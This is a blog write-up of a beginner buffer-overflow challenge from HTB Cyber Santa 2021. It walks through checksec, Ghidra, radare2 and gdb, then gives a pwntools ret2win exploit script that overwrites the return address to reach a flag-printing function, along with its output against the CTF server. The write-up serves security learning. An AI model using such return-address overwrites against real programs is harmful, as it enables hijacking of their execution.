---
layout: post
title: "HTB Cyber Santa Writeups: Mr Snowy"
image: ''
date:   2021-12-07 00:00:00
tags:
- hackthebox
- htb-cyber-santa
- binary-exploitation
- buffer-overflow
- pwntools
- radare2
- gdb
- beginner
- ret2win
description: ''
categories:
published: true
comments: false
---

![intro](https://an00brektn.github.io/img/htb-cyber-santa/Pasted image 20211205131825.png)

## Intro
Mr. Snowy was the binary exploitation/pwn challenge released on day 1, and was a classic stack-based buffer overflow, specifically what many call a "ret2win" challenge. After looking at the initial behavior, we'll go into some well-known reverse engineering  and debugging tools, ghidra, radare2, and gdb, and find a function (our "win" function) that will print the flag. With all of this together, we can use the `pwntools` library to make a quick exploit to insert the address of the win function into the RIP, and print out the flag. 

* buh
{:toc}

### Description
`There is ❄️ snow everywhere!! Kids are playing around, everything looks amazing. But, this ☃️ snowman... it scares me.. He is always 👀 staring at Santa's house. Something must be wrong with him.`

## Initial Observations
### Enumeration
We've done a stack-based buffer overflow on this blog before, but binary exploitation challenges usually require you to dig a bit deeper than just "spike every possible input", so we'll do that first. 

```bash
kali@transistor:~/ctf/santa_htb/day1/pwn_mr_snowy$ file mr_snowy 
mr_snowy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d6143c5f2214b3fe5c3569e23bd53666c7f7a366, not stripped
kali@transistor:~/ctf/santa_htb/day1/pwn_mr_snowy$ checksec mr_snowy
[*] '/home/kali/ctf/santa_htb/day1/pwn_mr_snowy/mr_snowy'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

From our `file` command, we learn that the binary is a 64-bit ELF file, which isn't too crazy. As for the other command, `checksec` comes from the [pwntools](https://github.com/Gallopsled/pwntools) toolkit, a "CTF framework and exploit developement library" that makes exploit development easy. It'll return some information on the architecture and memory protections on the program. A brief explanation on each:

- **RELRO** stands for Relocation Read-Only, which is currently out of scope of my knowledge (still haven't studied binary exploitation that deep), but you can read more [here](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro)
- **Stack Canaries** come from the old practice of leaving a canary at the opening of a coal mine. If the canary stopped chirping, that meant there were noxious gasses and the miners needed to leave (dark, I know). Here, they detect stack overflows. If the stack is overflown, the canary basically flips a switch telling the program to shut down before something bad happens.
- **NX** is short for non-executable. If this is enabled, this means memory segments can either be written to or executed, but not both. Simply put, we can't put shellcode on the stack and expect it to execute.
- **PIE** stands for Position Independent Executable. If enabled, dependencies will be loaded into random locations, making it harder to rely on how memory is mapped out.

Coming back to `checksec`, we don't really have to worry about RELRO because this is a beginner challenge, but the NX will mean we probably will not get a shell from our exploit.

### Running the Program
The program plays like a "choose your own adventure", but you lose no matter what you do (says something about society I guess).
```bash
kali@transistor:~/ctf/santa_htb/day1/pwn_mr_snowy$ ./mr_snowy

[Location]: 🎅 Santa's garden..

   _____    *  *  *  *  *     *  *
   |   |        *   *    *   * ** 
  _|___|_     *  *  *   *  **  *
  ( 0 0 )   *   *  *   * *   * *   *
 (   *   )    *   *    *    *   * *
(    *    )      *  *   *  *   *  *
 \_______/    *   *   *  ***   **


[*] This snowman looks sus..

1. Investigate 🔎
2. Let it be   ⛄
> 1

[!] After some investigation, you found a secret camera inside the snowman!

1. Deactivate ⚠️
2. Break it   🔨
> 1

[!] You do not know the password!
[-] Mission failed!
```

If you "Let it be", you lose. If you "Deactivate", you don't know the password, and lose. If you "Break it", it's said to be "unbreakable", and you lose. What gives? 

## Decompiling, Disassembling, and Reversing
Before continuning, I'll preface everything here as being a little bit overkill. We're going to go over ghidra, radare2, and gdb, but you really only need gdb for this challenge because spoiler: it's just a buffer overflow. But, because it's good learning, we'll briefly touch on some tools for learning purposes.

### ghidra
[ghidra](https://github.com/NationalSecurityAgency/ghidra) is a tool developed by the NSA which is used for analyzing binaries, mostly known for it's decompiler, used to try and get the C code back from the assembly code. However, as a warning, ghidra is not perfect. The process of "decompiling" is looking at the assembly code, and guessing what the original code might have been. With this in mind, you'll have to do some cleaning of your own, especially if a program is longer.

Explaining all of ghidra's functions is enough for it's own standalone post, but for now, we'll make a new, non-shared project, import the `mr_snowy` file, and just follow along with the default settings.

![asdf](https://an00brektn.github.io/img/htb-cyber-santa/Pasted image 20211206122847.png)

Once we have the CodeBrowser open, things can look a little intimidating at first. For the time being, all we have to focus on is the "Functions" folder in the "Symbol Tree", the assembler code in the middle, and the code display on the right. If we click on `main` in the "Functions" folder, ghidra returns this.

```c
undefined8 main(void)

{
  setup();
  banner();
  snowman();
  return 0;
}
```

We can follow each of these functions by clicking on them. The `setup()` function sets up the initial buffer for user input (not important right now), and `banner()` is just the snowman we see every time we run the program. If we click on `snowman()`, we get this:

```c
void snowman(void)

{
  int iVar1;
  char local_48 [64];
  
  printstr(&DAT_004019a8);
  fflush(stdout);
  read(0,local_48,2);
  iVar1 = atoi(local_48);
  if (iVar1 != 1) {
    printstr("[*] It\'s just a cute snowman after all, nothing to worry about..\n");
    color("\n[-] Mission failed!\n",&DAT_0040161a,&DAT_00401664);
                    /* WARNING: Subroutine does not return */
    exit(-0x45);
  }
  investigate();
  return;
}
```

You can now see how the decompiling isn't the cleanest. There's one more function explicitly in the code, `investigate()`. 

```c
void investigate(void)

{
  int iVar1;
  char local_48 [64];
  
  fflush(stdout);
  printstr(&DAT_00401878);
  fflush(stdout);
  read(0,local_48,0x108);
  iVar1 = atoi(local_48);
  if (iVar1 == 1) {
    puts("\x1b[1;31m");
    printstr("[!] You do not know the password!\n[-] Mission failed!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x16);
  }
  iVar1 = atoi(local_48);
  if (iVar1 == 2) {
    puts("\x1b[1;31m");
    printstr(
            "[!] This metal seems unbreakable, the elves seem to have put a spell on it..\n[-] Mission failed!\n"
            );
                    /* WARNING: Subroutine does not return */
    exit(0x16);
  }
  fflush(stdout);
  puts("\x1b[1;31m");
  fflush(stdout);
  puts("[-] Mission failed!");
  fflush(stdout);
  return;
}
```

So far, haven't found any sign of a flag. However, there's an additional function that's noted that doesn't show up in the primary flow of logic.

```c
void deactivate_camera(void)

{
  char acStack104 [48];
  FILE *local_38;
  char *local_30;
  undefined8 local_28;
  int local_1c;
  
  local_1c = 0x30;
  local_28 = 0x2f;
  local_30 = acStack104;
  local_38 = fopen("flag.txt","rb");
  if (local_38 == (FILE *)0x0) {
    fwrite("[-] Could not open flag.txt, please conctact an Administrator.\n",1,0x3f,stdout);
                    /* WARNING: Subroutine does not return */
    exit(-0x45);
  }
  fgets(local_30,local_1c,local_38);
  puts("\x1b[1;32m");
  fwrite("[+] Here is the secret password to deactivate the camera: ",1,0x3a,stdout);
  puts(local_30);
  fclose(local_38);
  return;
}
```

When we run the program as-is, we never touch this function, but this is the function that contains the flag. Although I haven't really explained any of the code, we can tell that there's probably a buffer overflow (because of the unchecked user input in `investigate()`). While we can't insert shellcode, we could overwrite the instruction pointer to point at this function. We can use ghidra to find the address of the function in memory, but I'd rather highlight some other tools that you could use before we get to writing the exploit.

### radare2
[Radare2](https://rada.re/n/) is a tool for analyzing a variety of things, not just binaries, but is mainly used for its disassembler. While it doesn't try and recreate C from the assembly code, it tends to not make assumptions, and can give a more accurate look at the flow of logic, if you're comfortable looking at assembler. Again, there are many, many things that this tool can do, but we'll keep it simple for now. We can start using radare2 by calling it from the command line like so.

```bash
kali@transistor:~/ctf/santa_htb/day1/pwn_mr_snowy$ r2 -A mr_snowy
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x004009d0]> 
```

You can run r2 without the `-A` flag, but I include it to start the analysis immediately. We can use `s main` to "seek to main", and then run `pdf` to disassemble the function.

```bash
[0x004009d0]> s main
[0x0040153e]> pdf
            ; DATA XREF from entry0 @ 0x4009ed
┌ 26: int main (int argc, char **argv, char **envp);
│           0x0040153e      55             push rbp
│           0x0040153f      4889e5         mov rbp, rsp
│           0x00401542      e8aaffffff     call sym.setup
│           0x00401547      e82cfdffff     call sym.banner
│           0x0040154c      e819ffffff     call sym.snowman
│           0x00401551      b800000000     mov eax, 0
│           0x00401556      5d             pop rbp
└           0x00401557      c3             ret
```

Note how this looks similar to the ghidra output. We can get a list of the functions used in the program by running `afl`.

```bash
[0x0040153e]> afl
0x004009d0    1 42           entry0
0x00400a10    4 42   -> 37   sym.deregister_tm_clones
0x00400a40    4 58   -> 55   sym.register_tm_clones
0x00400a80    3 34   -> 29   sym.__do_global_dtors_aux
0x00400ab0    1 7            entry.init0
0x004015d0    1 2            sym.__libc_csu_fini
0x004015d4    1 9            sym._fini
0x00401165    3 275          sym.deactivate_camera
...[trim]...
0x00400d3b   40 946          sym.color
0x00400acf   16 620          sym.rainbow
0x00401374    5 246          sym.investigate
0x004008f0    1 6            sym.imp.read
0x00400970    1 6            sym.imp.atoi
0x00401560    4 101          sym.__libc_csu_init
0x00400ab7    1 24           sym.reset
0x004008d0    1 6            sym.imp.printf
0x00400a00    1 2            sym._dl_relocate_static_pie
0x0040146a    3 135          sym.snowman
0x0040153e    1 26           main
0x004014f1    1 77           sym.setup
...[trim]...
```

Note that this more clearly displays where each function is in memory. If we wanted to seek to the `sym.deactivate_camera` function, we can run `s sym.deactivate_camera`, followed by a `pdf` again (or run `pdf @ sym.deactivate_camera`).  I'll skip the output for brevity's sake.

The last command that may be useful is running `izz`, which is like running `strings` on the binary, but just a little bit smarter. Now that we know what we're looking at, let's look at gdb and developing the exploit with pwntools.

## Exploit Development
### gdb
[GDB](https://www.sourceware.org/gdb/), or the GNU Debugger, is a debugger for Unix-like operating systems that supports a variety of languages; it's basically what we'll use instead of Immunity Debugger or Windbg. For pwn challenges, I also like using an additional plugin known as [pwndbg](https://github.com/pwndbg/pwndbg), which simplifies some of syntax and makes it easier to look at. We can start the program with `r`, to run it. If we wanted to redirect input into the program, we can do `r < INPUT`, like how it normally works in Linux.

I'll start by trying to spike the program at both inputs, and find that only the second user input is susceptible to overflow.

```bash
pwndbg> r
Starting program: /home/kali/ctf/santa_htb/day1/pwn_mr_snowy/mr_snowy 


[Location]: 🎅 Santa's garden..

   _____    *  *  *  *  *     *  *
   |   |        *   *    *   * ** 
  _|___|_     *  *  *   *  **  *
  ( 0 0 )   *   *  *   * *   * *   *
 (   *   )    *   *    *    *   * *
(    *    )      *  *   *  *   *  *
 \_______/    *   *   *  ***   **


[*] This snowman looks sus..

1. Investigate 🔎
2. Let it be   ⛄
> 1

[!] After some investigation, you found a secret camera inside the snowman!

1. Deactivate ⚠️
2. Break it   🔨
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[-] Mission failed!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401469 in investigate ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0xc00
 RDX  0x0
 RDI  0x7ffff7fac690 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x0
 R8   0x0
 R9   0x0
 R10  0x7ffff7f5bac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
 R11  0x246
 R12  0x4009d0 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x4141414141414141 ('AAAAAAAA')
 RSP  0x7fffffffdde8 ◂— 'AAAAAAAA\n\n@'
 RIP  0x401469 (investigate+245) ◂— ret    
──────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────
 ► 0x401469 <investigate+245>    ret    <0x4141414141414141>

──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdde8 ◂— 'AAAAAAAA\n\n@'
01:0008│     0x7fffffffddf0 —▸ 0x400a0a ◂— add    byte ptr [rax], al
02:0010│     0x7fffffffddf8 —▸ 0x401733 ◂— sbb    ebx, dword ptr [rbx + 0x31]
03:0018│     0x7fffffffde00 —▸ 0x4016e8 ◂— sbb    ebx, dword ptr [rbx + 0x31]
04:0020│     0x7fffffffde08 —▸ 0x40173b ◂— sbb    ebx, dword ptr [rbx + 0x31]
05:0028│     0x7fffffffde10 —▸ 0x401743 ◂— sbb    ebx, dword ptr [rbx + 0x31]
06:0030│     0x7fffffffde18 —▸ 0x40174b ◂— sbb    ebx, dword ptr [rbx + 0x31]
07:0038│     0x7fffffffde20 —▸ 0x401780 ◂— and    byte ptr [rax], ah
────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────
 ► f 0         0x401469 investigate+245
   f 1 0x4141414141414141
   f 2         0x400a0a
   f 3         0x401733
   f 4         0x4016e8
   f 5         0x40173b
   f 6         0x401743
   f 7         0x40174b
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Since this is a 64-bit program, the size of the registers are larger, and therefore it's the RIP instead of the EIP, and the RSP instead of the ESP. Additionally, as opposed to the overflow we saw in [Brainstorm](https://an00brektn.github.io/thm-brainstorm), if you overflow the RIP with an invalid value, it just won't change, but it still is overflowed (this troubled me for a little bit). Normally, we would determine the exact offset using a cyclic string, but since we already have the source code, we've seen that a buffer of 64 bytes is allocated for user input, meaning it takes 72 bytes to completely overwrite the RIP.

Aside from this, all we really need is the memory address of the `deactivate_camera()` function. I've already shown two tools you can use to locate this, but pwndbg lets us do this in two different ways. We can run `info functions` to get a list of all functions.
```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400868  _init
...[trim]...
0x00000000004009d0  _start
0x0000000000400a00  _dl_relocate_static_pie
0x0000000000400a10  deregister_tm_clones
0x0000000000400a40  register_tm_clones
0x0000000000400a80  __do_global_dtors_aux
0x0000000000400ab0  frame_dummy
0x0000000000400ab7  reset
0x0000000000400acf  rainbow
0x0000000000400d3b  color
0x00000000004010ed  printstr
0x0000000000401165  deactivate_camera
0x0000000000401278  banner
0x0000000000401374  investigate
0x000000000040146a  snowman
0x00000000004014f1  setup
0x000000000040153e  main
0x0000000000401560  __libc_csu_init
0x00000000004015d0  __libc_csu_fini
0x00000000004015d4  _fini
```

Or we can use `print& deactivate_camera` for the specific function that we want.
```bash
pwndbg> print& deactivate_camera
$1 = (<text variable, no debug info> *) 0x401165 <deactivate_camera>
```

We also could have disassembled any of these functions in pwndbg using `disassemble FUNCTION`. I encourage you to read through the documentation and learn more.

### pwntools
Now, we can finally get to writing the exploit. The tricky thing here is not actually writing it- all we have to do is send 64 A's followed by a return address -but getting past all of the cosmetic additions. Luckily, `pwntools` simplifies this process with a variety of functions. I'll show you the code and then explain it afterwards.

```python
from pwn import *

context.log_level = 'info'

exe = './mr_snowy'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# Start program
io = process('./mr_snowy')
#io = remote('138.68.174.27', 31056)
offset = 72
# Build the payload
payload = flat(
    {offset: 0x00401165}
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter('> ', "1")
io.sendlineafter('> ', payload)
io.recvuntil('[+] Here is the secret password to deactivate the camera: ')
# Get our flag!
flag = io.recv()
success(flag)
```

This is a stripped down version of the code that [CryptoCat](https://github.com/Crypto-Cat/CTF/blob/main/HTB/pwn/reg/reg.py) used in his walkthrough of Reg on HackTheBox, because it's a good template to work off of (note that it is in python2 because that's just what pwn authors like using). To sum things up:
- We set a log level for debugging the exploit
- We tell pwntools what kind of architecture we're working with in the line where we assign stuff to `elf`
- We start the process, and use `flat()` to flatten our arguments into a string. We don't even have to rewrite our RIP in little-endian, pwntools takes care of that.
- We use the `sendlineafter()` to avoid playing with `recv()`s, and just specify at what point we want data to be sent.
- And then we get the flag!

## Grabbing the Flag
Locally, we get this:
```bash
(env) kali@transistor:~/ctf/santa_htb/day1/pwn_mr_snowy$ python exploit.py 
[+] Starting local process './mr_snowy': pid 1557
[+] HTB{f4k3_fl4g_4_t3st1ng}
    
[*] Stopped process './mr_snowy' (pid 1557)
```
<sub>*I have a virtual environment for pwntools in python2, hence the "env"*</sub>

The neat thing about pwntools is that we can just change the `process()` method for `remote()`, specifying the address, while the rest of our syntax can stay the same. Running the exploit against the remote target, we get the flag.

```bash
(env) kali@transistor:~/ctf/santa_htb/day1/pwn_mr_snowy$ python exploit.py 
[+] Opening connection to 138.68.174.27 on port 31056: Done
[+] HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}
    
[*] Closed connection to 138.68.174.27 port 31056
```

## Additional Resources
Binary exploitation goes very, very deep, and I'm excited to begin learning about it when I have time. If you want to learn more, here are some resources:

- [Nighmare - Intro to Pwn/Rev](https://guyinatuxedo.github.io/index.html)
- [ir0nstone's pwn notes](https://ir0nstone.gitbook.io/notes/)
- [THM Intro to pwntools](https://tryhackme.com/room/introtopwntools)
- [CryptoCat YouTube](https://www.youtube.com/channel/UCEeuul0q7C8Zs5C8rc4REFQ)
- [LiveOverflow YouTube](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)

Apologies if this post was a little more verbose than it really needed to be, but I hope you learned something, or remembered something, or found something I said wrong and are able to correct me :) 